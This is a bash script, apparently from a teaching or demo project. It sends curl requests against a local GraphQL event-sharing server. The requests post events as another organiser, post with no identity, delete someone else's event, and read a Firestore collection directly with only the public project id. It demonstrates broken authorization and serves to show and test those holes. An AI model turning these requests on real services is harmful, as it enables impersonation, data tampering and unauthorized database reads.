#!/usr/bin/env bash
# Requests an attacker could send, as one-word commands.
#
# Each command is one ordinary curl request.
#
#   ./attacks.sh post-as mei        post an event claiming to be Mei (u3)
#   ./attacks.sh post               post an event claiming to be nobody
#   ./attacks.sh delete free-samosas    delete somebody else's event
#   ./attacks.sh reset              put the six seed events back (dev route)
#   ./attacks.sh peek organisers    read a Firestore collection directly,
#                                   bypassing our server completely
#
# Set KAI_TOKEN to send a Firebase ID token with the request, e.g. one copied
# from the dashboard's token panel:
#
#   KAI_TOKEN=eyJhbGciOi... ./attacks.sh post
set -uo pipefail
cd "$(dirname "$0")"

SERVER="${KAI_SERVER:-http://localhost:3734}"

# The Firebase project id, for "peek". Read from the dashboard's config so
# there is one place to set it.
project_id() {
  if [ -n "${FIREBASE_PROJECT_ID:-}" ]; then echo "$FIREBASE_PROJECT_ID"; return; fi
  if [ -f web/.env.local ]; then
    sed -n 's/^VITE_FIREBASE_PROJECT_ID=//p' web/.env.local | tr -d '"' | head -1
  fi
}

pretty() {
  if command -v jq >/dev/null 2>&1; then
    jq . 2>/dev/null || cat
  else
    # node is always here: the server needs it.
    node -e 'let s="";process.stdin.on("data",d=>s+=d).on("end",()=>{try{console.log(JSON.stringify(JSON.parse(s),null,2))}catch{process.stdout.write(s)}})'
  fi
}

# POST a GraphQL operation and show the status line as well as the body, so
# the difference between 200, 400, 401 and 403 is visible.
graphql() {
  local body="$1" out status
  local auth=()
  if [ -n "${KAI_TOKEN:-}" ]; then auth=(-H "Authorization: Bearer ${KAI_TOKEN}"); fi
  out=$(curl -s -w $'\n%{http_code}' -X POST "$SERVER/graphql" \
    -H 'Content-Type: application/json' "${auth[@]}" -d "$body")
  status="${out##*$'\n'}"
  echo "$out" | sed '$d' | pretty
  echo "HTTP $status"
}

organiser_id() {
  case "$1" in
    priya) echo u1 ;; tama) echo u2 ;; mei) echo u3 ;; josh) echo u4 ;;
    *) echo "$1" ;;
  esac
}

cmd="${1:-help}"
case "$cmd" in
  post-as)
    who="${2:-mei}"
    id=$(organiser_id "$who")
    echo "POST /graphql  postEvent(..., postedById: \"$id\")   # claiming to be $who"
    graphql "{\"query\":\"mutation { postEvent(name: \\\"Definitely real kai\\\", location: \\\"Trust me\\\", emoji: \\\"🙃\\\", portions: 99, lat: -36.8523, lng: 174.7691, postedById: \\\"$id\\\") { id name postedBy { name dept } } }\"}"
    ;;
  post)
    echo "POST /graphql  postEvent(...)   # no postedById: let the server decide who I am"
    graphql '{"query":"mutation { postEvent(name: \"Anonymous kai\", location: \"Somewhere\", emoji: \"🥡\", portions: 5, lat: -36.8523, lng: 174.7691) { id name postedBy { name dept } } }"}'
    ;;
  delete)
    id="${2:-free-samosas}"
    echo "POST /graphql  deleteEvent(id: \"$id\")"
    graphql "{\"query\":\"mutation { deleteEvent(id: \\\"$id\\\") }\"}"
    ;;
  reset)
    echo "POST /reset"
    curl -s -X POST "$SERVER/reset" | pretty
    echo
    ;;
  peek)
    collection="${2:-organisers}"
    pid=$(project_id)
    if [ -z "$pid" ]; then
      echo "No project id. Set VITE_FIREBASE_PROJECT_ID in web/.env.local, or"
      echo "run: FIREBASE_PROJECT_ID=your-project ./attacks.sh peek $collection"
      exit 1
    fi
    url="https://firestore.googleapis.com/v1/projects/$pid/databases/(default)/documents/$collection"
    echo "GET $url"
    echo "# No token, no server, no app. Just the public Firebase project id."
    out=$(curl -s -w $'\n%{http_code}' "$url")
    status="${out##*$'\n'}"
    echo "$out" | sed '$d' | pretty
    echo "HTTP $status"
    ;;
  *)
    sed -n '2,24p' "$0" | sed 's/^# \{0,1\}//'
    ;;
esac
